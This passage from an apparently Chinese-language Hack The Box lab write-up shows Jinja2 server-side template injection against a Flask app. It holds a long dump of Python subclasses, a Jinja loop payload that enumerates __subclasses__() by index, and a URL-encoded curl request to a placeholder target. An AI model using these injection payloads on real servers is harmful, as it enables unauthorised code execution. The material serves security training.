&amp;lt;class &amp;#39;itertools.takewhile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.islice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.starmap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.chain&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.filterfalse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.count&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.zip_longest&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.permutations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.product&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.repeat&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools.groupby&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._grouper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itertools._tee_dataobject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reprlib.Repr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections.deque&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._deque_reverse_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_collections._tuplegetter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;collections._Link&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partial&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools._lru_cache_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.partialmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.singledispatchmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;functools.cached_property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.DynamicClassAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types._GeneratorWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enum.auto&amp;#39;&amp;gt;, &amp;lt;enum &amp;#39;Enum&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Pattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Match&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sre.SRE_Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.State&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.SubPattern&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;sre_parse.Tokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;re.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;string.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib.ContextDecorator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._GeneratorContextManagerBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;contextlib._BaseExitStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Final&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._Immutable&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.Generic&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEmpty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing._TypingEllipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.NamedTuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.io&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;typing.re&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ast.AST&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;markupsafe._MarkupEscapeHelper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.poll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;select.epoll&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;selectors.BaseSelector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_socket.socket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset._IterationGuard&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_weakrefset.WeakSet&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading._RLock&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Condition&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Semaphore&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Barrier&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;threading.Thread&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseServer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ForkingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver._NoThreads&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.ThreadingMixIn&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;socketserver.BaseRequestHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.WarningMessage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;warnings.catch_warnings&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.date&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.timedelta&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.time&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;datetime.tzinfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize._Info&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref.finalize&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha512.sha512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_random.Random&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinStr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._ResultMixinBytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.parse._NetlocResultMixinBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_month&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar._localized_day&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.Calendar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;calendar.different_locale&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._parseaddr.AddrlistClass&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;Struct&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unpack_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.charset.Charset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header.Header&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.header._ValueFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email._policybase._PolicyBase&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.BufferedSubFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.feedparser.FeedParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.parser.BytesParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;email.message.Message&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.client.HTTPConnection&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl._SSLSocket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.MemoryBIO&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_ssl.Session&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ssl.SSLObject&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mimetypes.MimeTypes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Compress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;zlib.Decompress&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Compressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_bz2.BZ2Decompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMACompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_lzma.LZMADecompressor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dis.Bytecode&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tokenize.Untokenizer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BlockFinder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._void&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect._empty&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.BoundArguments&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;inspect.Signature&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.FrameSummary&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback.TracebackException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LogRecord&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PercentStyle&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Formatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.BufferingFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.Filterer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.PlaceHolder&amp;#39;&amp;gt;, &amp;lt;class {{ ''.__class__.__mro__ }}</span><br><span class="line">&amp;#39;logging.Manager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;logging.LoggerAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug._internal._Missing&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.exceptions.Aborter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.urls.Href&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.CompletedProcess&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;subprocess.Popen&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_hashlib.HASH&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2b&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_blake2.blake2s&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_224&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_384&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.sha3_512&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_128&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_sha3.shake_256&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._RandomNameSequence&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileCloser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile._TemporaryFileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.SpooledTemporaryFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tempfile.TemporaryDirectory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.OpenerDirector&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.BaseHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.HTTPPasswordMgr&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractBasicAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.AbstractDigestAuthHandler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.URLopener&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;urllib.request.ftpwrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Cookie&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookiePolicy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.Absent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;http.cookiejar.CookieJar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableListMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures._omd_bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Headers&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ImmutableHeadersMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.IfRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.Range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.ContentRange&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.datastructures.FileStorage&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._HAS_DEFAULT_FACTORY_CLASS&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._MISSING_TYPE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._FIELD_BASE&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.InitVar&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses.Field&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dataclasses._DataclassParams&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.Event&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.multipart.MultipartEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Finder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.Loader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;importlib.abc.ResourceReader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpImporter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pkgutil.ImpLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hmac.HMAC&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.ClosingIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi.FileWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wsgi._RangeWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.utils.HTMLBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.accept.AcceptMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.AuthorizationMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Scanner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_json.Encoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.decoder.JSONDecoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;json.encoder.JSONEncoder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.FormDataParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.formparser.MultiPartParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.user_agent.UserAgent&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.useragents._UserAgentParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.request.Request&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.request.StreamOnlyMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.sansio.response.Response&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.response.ResponseStreamMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagRequestMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.etag.ETagResponseMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.wrappers.user_agent.UserAgentMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieHeaders&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test._TestCookieResponse&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.EnvironBuilder&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.test.Client&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Decimal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.SignalDictMixin&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;decimal.ContextManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;numbers.Number&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;uuid.UUID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.Pdata&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.PicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;_pickle.UnpicklerMemoProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Framer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unframer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Pickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle._Unpickler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.Bucket&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.bccache.BytecodeCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.MissingType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.LRUCache&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Cycler&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Joiner&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.utils.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.EvalContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.nodes.Node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.visitor.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.idtracking.Symbols&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.MacroRef&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.compiler.Frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.TemplateReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.BlockReference&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.LoopContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Macro&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.runtime.Undefined&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ast.NodeVisitor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Failure&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStreamIterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.TokenStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.lexer.Lexer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.parser.Parser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Environment&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.Template&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateModule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateExpression&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.environment.TemplateStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;jinja2.loaders.BaseLoader&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.Local&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalStack&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalManager&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local._ProxyLookup&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.local.LocalProxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.SequenceMatcher&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.Differ&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;difflib.HtmlDiff&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint._safe_key&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pprint.PrettyPrinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleFactory&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.RuleTemplate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.BaseConverter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.Map&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;werkzeug.routing.MapAdapter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;gettext.NullTranslations&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._FixupStream&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click._compat._AtomicFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.LazyFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.KeepOpenFile&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.utils.PacifyFlushWrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.types.ParamType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Option&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.Argument&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.ParsingState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.parser.OptionParser&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.formatting.HelpFormatter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Context&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.BaseCommand&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;click.core.Parameter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals.Namespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.signals._FakeSignal&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.DispatchingApp&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.cli.ScriptInfo&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.config.ConfigAttribute&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx._AppCtxGlobals&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.AppContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.ctx.RequestContext&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.scaffold.Scaffold&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous._json._CompactJSON&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.SigningAlgorithm&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.signer.Signer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;itsdangerous.serializer.Serializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.JSONTag&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.json.tag.TaggedJSONSerializer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.sessions.SessionInterface&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;flask.blueprints.BlueprintSetupState&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;unicodedata.UCD&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;__future__._Feature&amp;#39;&amp;gt;]&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>让我们使用下面的有效负载打印出数字和方法名称。</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">450</span>) %} </span><br><span class="line">{{ i }}</span><br><span class="line">{{ <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[i].__name__ }} </span><br><span class="line">{% endfor %}</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt; 0 type  1 weakref  2 weakcallableproxy  3 weakproxy  4 int  5 bytearray  6 bytes  7 list  8 NoneType  9 NotImplementedType  10 traceback  11 super  12 range  13 dict  14 dict_keys  15 dict_values  16 dict_items  17 dict_reversekeyiterator  18 dict_reversevalueiterator  19 dict_reverseitemiterator  20 odict_iterator  21 set  22 str  23 slice  24 staticmethod  25 complex  26 float  27 frozenset  28 property  29 managedbuffer  30 memoryview  31 tuple  32 enumerate  33 reversed  34 stderrprinter  35 code  36 frame  37 builtin_function_or_method  38 method  39 function  40 mappingproxy  41 generator  42 getset_descriptor  43 wrapper_descriptor  44 method-wrapper  45 ellipsis  46 member_descriptor  47 SimpleNamespace  48 PyCapsule  49 longrange_iterator  50 cell  51 instancemethod  52 classmethod_descriptor  53 method_descriptor  54 callable_iterator  55 iterator  56 PickleBuffer  57 coroutine  58 coroutine_wrapper  59 InterpreterID  60 EncodingMap  61 fieldnameiterator  62 formatteriterator  63 BaseException  64 hamt  65 hamt_array_node  66 hamt_bitmap_node  67 hamt_collision_node  68 keys  69 values  70 items  71 Context  72 ContextVar  73 Token  74 MISSING  75 moduledef  76 module  77 filter  78 map  79 zip  80 _ModuleLock  81 _DummyModuleLock  82 _ModuleLockManager  83 ModuleSpec  84 BuiltinImporter  85 classmethod  86 FrozenImporter  87 _ImportLockContext  88 _localdummy  89 _local  90 lock  91 RLock  92 _IOBase  93 _BytesIOBuffer  94 IncrementalNewlineDecoder  95 ScandirIterator  96 DirEntry  97 WindowsRegistryFinder  98 _LoaderBasics  99 FileLoader  100 _NamespacePath  101 _NamespaceLoader  102 PathFinder  103 FileFinder  104 zipimporter  105 _ZipImportResourceReader  106 Codec  107 IncrementalEncoder  108 IncrementalDecoder  109 StreamReaderWriter  110 StreamRecoder  111 _abc_data  112 ABC  113 dict_itemiterator  114 Hashable  115 Awaitable  116 AsyncIterable  117 async_generator  118 Iterable  119 bytes_iterator  120 bytearray_iterator  121 dict_keyiterator  122 dict_valueiterator  123 list_iterator  124 list_reverseiterator  125 range_iterator  126 set_iterator  127 str_iterator  128 tuple_iterator  129 Sized  130 Container  131 Callable  132 _wrap_close  133 Quitter  134 _Printer  135 _Helper  136 itemgetter  137 attrgetter  138 methodcaller  139 accumulate  140 combinations  141 combinations_with_replacement  142 cycle  143 dropwhile  144 takewhile  145 islice  146 starmap  147 chain  148 compress  149 filterfalse  150 count  151 zip_longest  152 permutations  153 product  154 repeat  155 